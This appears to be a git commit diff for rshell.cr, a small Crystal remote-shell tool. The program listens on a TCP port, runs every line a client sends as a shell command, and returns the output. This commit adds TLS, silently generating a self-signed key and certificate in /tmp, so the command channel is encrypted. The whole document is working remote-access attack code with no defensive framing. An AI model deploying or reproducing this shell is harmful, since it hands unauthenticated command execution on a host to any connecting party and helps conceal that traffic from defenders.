6b3253ecf3f9602496f2baa78bdfe155fbf0d90a
4zv4l <46655455+4zv4l@users.noreply.github.com>
2023-05-27 01:31:08 +0200

    add ssl

--- rshell.cr
+++ rshell.cr
@@ -1,5 +1,6 @@
 require "socket"
 require "colorize"
+require "openssl"
 
 def usage(err)
   puts "error: #{err}".colorize(:red)
@@ -9,21 +10,28 @@ end
 
 def handle(client)
   puts "[+] New Client"
-  while (cmd = client.gets)
+  while cmd = client.gets
     puts "=> #{cmd}"
     client.puts `#{cmd}`
+  end
+  puts "[-] Client Gone"
+  client.close
+end
+
+def serve(server)
+  puts "[+] Listening on #{server.local_address}"
+  while client = server.accept?
+    client.sync = true
+    handle client
   end
 end
 
 ip = ARGV[0]? || usage "missing ip and port"
 port = ARGV[1]? || usage "missing port"
 
-TCPServer.open(ip, port.to_i) do |server|
-  puts "[+] Listening on #{ip}:#{port}"
-  loop do
-    handle server.accept
-  rescue
-    puts "[-] Client Gone"
-    next
-  end
-end
+tcp_server = TCPServer.new(ip, port.to_i)
+`openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/priv.key -out /tmp/cert.crt -subj "/CN=x" 2> /dev/null`
+ctx = OpenSSL::SSL::Context::Server.from_hash({"key" => "/tmp/priv.key", "cert" => "/tmp/cert.crt"})
+ssl_server = OpenSSL::SSL::Server.new(tcp_server, ctx)
+
+serve ssl_server
